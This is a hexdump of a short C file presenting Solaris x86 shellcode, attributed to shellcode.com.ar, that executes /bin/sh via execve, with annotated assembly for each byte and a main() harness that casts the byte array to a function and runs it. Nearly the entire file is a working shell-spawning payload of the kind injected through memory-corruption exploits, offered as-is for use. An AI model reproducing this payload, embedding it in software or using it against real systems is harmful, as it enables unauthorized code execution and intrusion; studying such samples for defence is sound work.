00000000  2f 2a 0d 0a 20 2a 20 53  6f 6c 61 72 69 73 20 73  |/*.. * Solaris s|
00000010  68 65 6c 6c 63 6f 64 65  20 2d 20 65 78 65 63 76  |hellcode - execv|
00000020  65 20 2f 62 69 6e 2f 73  68 0d 0a 20 2a 2f 0d 0a  |e /bin/sh.. */..|
00000030  0d 0a 23 69 6e 63 6c 75  64 65 20 0d 0a 0d 0a 2f  |..#include ..../|
00000040  2f 20 68 74 74 70 3a 2f  2f 77 77 77 2e 73 68 65  |/ http://www.she|
00000050  6c 6c 63 6f 64 65 2e 63  6f 6d 2e 61 72 0d 0a 2f  |llcode.com.ar../|
00000060  2f 0d 0a 2f 2f 20 65 78  65 63 76 65 28 2f 2f 62  |/..// execve(//b|
00000070  69 6e 2f 73 68 29 0d 0a  0d 0a 63 68 61 72 20 73  |in/sh)....char s|
00000080  68 65 6c 6c 63 6f 64 65  5b 5d 3d 0d 0a 20 20 20  |hellcode[]=..   |
00000090  22 5c 78 62 38 5c 78 66  66 5c 78 66 38 5c 78 66  |"\xb8\xff\xf8\xf|
000000a0  66 5c 78 33 63 22 20 20  20 20 20 20 20 2f 2f 20  |f\x3c"       // |
000000b0  6d 6f 76 20 20 20 20 65  61 78 2c 20 30 33 63 66  |mov    eax, 03cf|
000000c0  66 66 38 66 66 68 0d 0a  20 20 20 22 5c 78 66 37  |ff8ffh..   "\xf7|
000000d0  5c 78 64 30 22 20 20 20  20 20 20 20 20 20 20 20  |\xd0"           |
000000e0  20 20 20 20 20 20 20 20  2f 2f 20 6e 6f 74 20 20  |        // not  |
000000f0  20 20 65 61 78 0d 0a 20  20 20 22 5c 78 35 30 22  |  eax..   "\x50"|
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000110  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000120  20 65 61 78 0d 0a 20 20  20 22 5c 78 33 31 5c 78  | eax..   "\x31\x|
00000130  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
00000140  20 20 20 20 20 20 2f 2f  20 78 6f 72 20 20 20 20  |      // xor    |
00000150  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 22 5c 78  |eax, eax..   "\x|
00000160  62 30 5c 78 39 61 22 20  20 20 20 20 20 20 20 20  |b0\x9a"         |
00000170  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000180  20 20 20 20 61 6c 2c 20  30 39 61 68 0d 0a 20 20  |    al, 09ah..  |
00000190  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000001b0  20 70 75 73 68 20 20 20  65 61 78 0d 0a 20 20 20  | push   eax..   |
000001c0  22 5c 78 38 39 5c 78 65  35 22 20 20 20 20 20 20  |"\x89\xe5"      |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000001e0  6d 6f 76 20 20 20 20 65  62 70 2c 20 65 73 70 0d  |mov    ebp, esp.|
000001f0  0a 20 20 20 22 5c 78 33  31 5c 78 63 30 22 20 20  |.   "\x31\xc0"  |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000210  20 2f 2f 20 78 6f 72 20  20 20 20 65 61 78 2c 20  | // xor    eax, |
00000220  65 61 78 0d 0a 20 20 20  22 5c 78 35 30 22 20 20  |eax..   "\x50"  |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000240  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 65  |     // push   e|
00000250  61 78 0d 0a 20 20 20 22  5c 78 36 38 5c 78 32 66  |ax..   "\x68\x2f|
00000260  5c 78 32 66 5c 78 37 33  5c 78 36 38 22 20 20 20  |\x2f\x73\x68"   |
00000270  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 64 77  |    // push   dw|
00000280  6f 72 64 20 36 38 37 33  32 66 32 66 68 0d 0a 20  |ord 68732f2fh.. |
00000290  20 20 22 5c 78 36 38 5c  78 32 66 5c 78 36 32 5c  |  "\x68\x2f\x62\|
000002a0  78 36 39 5c 78 36 65 22  20 20 20 20 20 20 20 2f  |x69\x6e"       /|
000002b0  2f 20 70 75 73 68 20 20  20 64 77 6f 72 64 20 36  |/ push   dword 6|
000002c0  65 36 39 36 32 32 66 68  0d 0a 20 20 20 22 5c 78  |e69622fh..   "\x|
000002d0  38 39 5c 78 65 33 22 20  20 20 20 20 20 20 20 20  |89\xe3"         |
000002e0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000002f0  20 20 20 20 65 62 78 2c  20 65 73 70 0d 0a 20 20  |    ebx, esp..  |
00000300  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000320  20 70 75 73 68 20 20 20  65 61 78 0d 0a 20 20 20  | push   eax..   |
00000330  22 5c 78 35 33 22 20 20  20 20 20 20 20 20 20 20  |"\x53"          |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000350  70 75 73 68 20 20 20 65  62 78 0d 0a 20 20 20 22  |push   ebx..   "|
00000360  5c 78 38 39 5c 78 65 32  22 20 20 20 20 20 20 20  |\x89\xe2"       |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
00000380  6f 76 20 20 20 20 65 64  78 2c 20 65 73 70 0d 0a  |ov    edx, esp..|
00000390  20 20 20 22 5c 78 35 30  22 20 20 20 20 20 20 20  |   "\x50"       |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  2f 2f 20 70 75 73 68 20  20 20 65 61 78 0d 0a 20  |// push   eax.. |
000003c0  20 20 22 5c 78 35 32 22  20 20 20 20 20 20 20 20  |  "\x52"        |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000003e0  2f 20 70 75 73 68 20 20  20 65 64 78 0d 0a 20 20  |/ push   edx..  |
000003f0  20 22 5c 78 35 33 22 20  20 20 20 20 20 20 20 20  | "\x53"         |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000410  20 70 75 73 68 20 20 20  65 62 78 0d 0a 20 20 20  | push   ebx..   |
00000420  22 5c 78 62 30 5c 78 33  62 22 20 20 20 20 20 20  |"\xb0\x3b"      |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000440  6d 6f 76 20 20 20 20 61  6c 2c 20 35 39 0d 0a 20  |mov    al, 59.. |
00000450  20 20 22 5c 78 66 66 5c  78 64 35 22 3b 20 20 20  |  "\xff\xd5";   |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000470  2f 20 63 61 6c 6c 20 20  20 65 62 70 0d 0a 0d 0a  |/ call   ebp....|
00000480  2f 2f 0d 0a 0d 0a 69 6e  74 0d 0a 6d 61 69 6e 28  |//....int..main(|
00000490  76 6f 69 64 29 0d 0a 7b  0d 0a 20 20 20 20 76 6f  |void)..{..    vo|
000004a0  69 64 20 28 2a 63 6f 64  65 29 28 29 20 3d 20 28  |id (*code)() = (|
000004b0  76 6f 69 64 20 2a 29 73  68 65 6c 6c 63 6f 64 65  |void *)shellcode|
000004c0  3b 0d 0a 20 20 20 20 70  72 69 6e 74 66 28 22 53  |;..    printf("S|
000004d0  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 67 74 68 3a  |hellcode length:|
000004e0  20 25 64 5c 6e 22 2c 20  73 74 72 6c 65 6e 28 73  | %d\n", strlen(s|
000004f0  68 65 6c 6c 63 6f 64 65  29 29 3b 0d 0a 20 20 20  |hellcode));..   |
00000500  20 63 6f 64 65 28 29 3b  0d 0a 20 20 20 20 72 65  | code();..    re|
00000510  74 75 72 6e 28 31 29 3b  0d 0a 7d                 |turn(1);..}|
0000051b
